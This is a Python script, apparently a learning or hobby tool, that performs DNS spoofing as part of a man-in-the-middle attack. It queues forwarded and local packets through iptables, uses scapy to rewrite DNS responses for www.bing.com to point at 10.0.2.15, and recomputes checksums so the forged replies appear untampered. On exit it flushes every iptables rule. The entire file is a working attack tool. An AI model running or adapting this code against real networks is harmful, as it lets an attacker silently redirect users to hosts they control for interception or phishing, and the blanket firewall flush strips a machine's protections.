#########################################################################
# Author : Dhrumil Mistry
#########################################################################


#########################################################################
# If you encounter Import error after installing netfilter use command 
# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
#########################################################################


from subprocess import call
import netfilterqueue
import scapy.all as scapy


SPOOF_WEBSITE = b'www.bing.com'
SPOOF_RDATA = b'10.0.2.15'


def forward_packets():
    '''configures the mitm for incoming request packets
    into a queue

    Args:
        None

    Returns:
        None
    '''

    # executing the following command
    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
    # -I -> insert (packet into a chain specified by the user)
    # -j -> jump if the packet matches the target.
    # --queue-num -> jump to specfic queue number
    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

    # for local host
    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)



def reset_config():
    '''
    resets the configurations changed while exectution of the program to 
    its original configuration

    Args:
        None

    Returns:
        None
    '''
    call('sudo iptables --flush', shell=True)



def process_packet(packet):
    '''
    process received packet, everytime a packet is received.
    prints the packet received in the queue and it changes 
    the DNS response dest ip with your desired ip

    Args:
        packet (scapy.IP): IP packet from netfilterqueue/iptables 

    Returns:
        None
    '''
    scapy_pkt = scapy.IP(packet.get_payload())

    # Check for DNS layer in DNS Request Record (DNSRR) or 
    # DNS Question Record (DNSQR)
    if scapy_pkt.haslayer(scapy.DNSRR):
        qname = scapy_pkt[scapy.DNSQR].qname
        if SPOOF_WEBSITE in qname:
            print('[*] Spoofing target ...')
            response = scapy.DNSRR(rrname=qname, rdata=SPOOF_RDATA)
            scapy_pkt[scapy.DNS].an = response
            scapy_pkt[scapy.DNS].ancount = 1

            # remove IP.len,IP.chksum,UDP.len,UDP.chksum to make
            # sure that our packet looks untampered and scapy will
            # calculate it again for us.
            del scapy_pkt[scapy.IP].len
            del scapy_pkt[scapy.IP].chksum
            del scapy_pkt[scapy.UDP].len
            del scapy_pkt[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_pkt))
            print(packet)

    packet.accept()


def run():
    '''Starts DNS spoofer

    Args:
        None

    Returns:
        None
    '''
    print('[*] configuring packet receiver...')

    forward_packets()
    print('[*] packet receiver configured successfully.\n')

    print('[*] Creating Queue to start receiving packets.')
    try:
        queue = netfilterqueue.NetfilterQueue()
        # Bind queue with queue-number 0
        queue.bind(0, process_packet)
        queue.run()

    except OSError as e:
        print('[-] Run script with root priviliges.')
        print(e)

    except KeyboardInterrupt:
        print('\r[-] Keyboard Interrupt detected!')

    except Exception:
        print('[-] An Exception occurred while creating queue.\n', Exception)

    finally:
        print('[*] Restoring previous configurations.. please be patient...')
        reset_config()

        print('[-] Program stopped.')


if __name__ == '__main__':
    run()
